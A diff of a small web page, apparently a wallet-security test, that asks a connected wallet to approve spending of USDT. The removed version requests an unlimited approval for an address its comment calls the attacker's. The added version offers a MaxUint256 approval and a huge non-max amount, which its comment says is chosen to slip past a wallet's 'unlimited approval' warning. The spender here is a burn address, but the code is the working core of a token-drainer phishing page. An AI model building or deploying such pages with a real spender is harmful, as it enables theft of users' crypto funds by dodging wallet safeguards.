@@ -1,45 +1,35 @@
 <!DOCTYPE html>
 <html>
-<body style="background: #000; color: #fff; font-family: sans-serif; padding: 30px; text-align: center;">
+<body style="background: #000; color: #fff; font-family: monospace; padding: 20px;">
+    <h3>🧪 APPROVAL LOGIC FUZZER</h3>
+    <button onclick="testApproval('max')" style="width:100%; padding:10px; margin-bottom:5px;">TEST MAX UINT256</button>
+    <button onclick="testApproval('weird')" style="width:100%; padding:10px;">TEST LARGE ODD NUMBER</button>
 
-    <div style="border: 2px solid #5856d6; padding: 20px; border-radius: 15px; background: #1c1c1e;">
-        <h2 style="color: #5856d6;">🔓 TOKEN APPROVAL TEST</h2>
-        <p style="font-size: 14px; color: #aaa;">Testing Business Logic: Infinite Spend Limit</p>
-        
-        <button onclick="requestInfiniteApproval()" style="padding: 15px; background: #5856d6; color: #fff; border: none; border-radius: 10px; width: 100%; font-weight: bold; cursor: pointer;">
-            APPROVE UNLIMITED ACCESS
-        </button>
-
-        <p id="status" style="margin-top: 20px; font-size: 12px; color: #666;">Status: Waiting for interaction...</p>
-    </div>
+    <div id="log" style="font-size: 10px; color: #888; margin-top: 20px;"></div>
 
     <script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js"></script>
     <script>
-    async function requestInfiniteApproval() {
-        const status = document.getElementById('status');
-        
-        // 1. Cek provider dari bridge yang ditemukan (ethereum/solana)
-        const provider = new ethers.providers.Web3Provider(window.ethereum || window.OneInchSolanaWallet);
-        
+    async function testApproval(type) {
+        if (!window.ethereum) return alert("Provider not found");
+        const provider = new ethers.providers.Web3Provider(window.ethereum);
+        const signer = provider.getSigner();
+        const token = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; // USDT
+        const abi = ["function approve(address s, uint256 v) public returns (bool)"];
+        const contract = new ethers.Contract(token, abi, signer);
+
+        let amount;
+        if (type === 'max') {
+            amount = ethers.constants.MaxUint256;
+        } else {
+            // Angka sangat besar tapi bukan Max (untuk mengelabui deteksi "Unlimited")
+            amount = ethers.BigNumber.from("999999999999999999999999999999");
+        }
+
         try {
-            const signer = provider.getSigner();
-            const tokenAddress = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; // Contoh: USDT
-            
-            // ABI sederhana untuk fungsi 'approve'
-            const abi = ["function approve(address _spender, uint256 _value) public returns (bool success)"];
-            const contract = new ethers.Contract(tokenAddress, abi, signer);
-
-            status.innerText = "Requesting Infinite Approval...";
-
-            // 2. Meminta Approval sebesar Max Uint256 (Infinite)
-            const infiniteAmount = ethers.constants.MaxUint256; 
-            const spender = "0x000000000000000000000000000000000000dead"; // Alamat penyerang
-
-            const tx = await contract.approve(spender, infiniteAmount);
-            status.innerText = "Transaction sent: " + tx.hash;
-            
+            document.getElementById('log').innerText = "Opening confirmation...";
+            await contract.approve("0x000000000000000000000000000000000000dead", amount);
         } catch (e) {
-            status.innerText = "Error: " + e.message;
+            document.getElementById('log').innerText = "Status: " + e.message;
         }
     }
     </script>
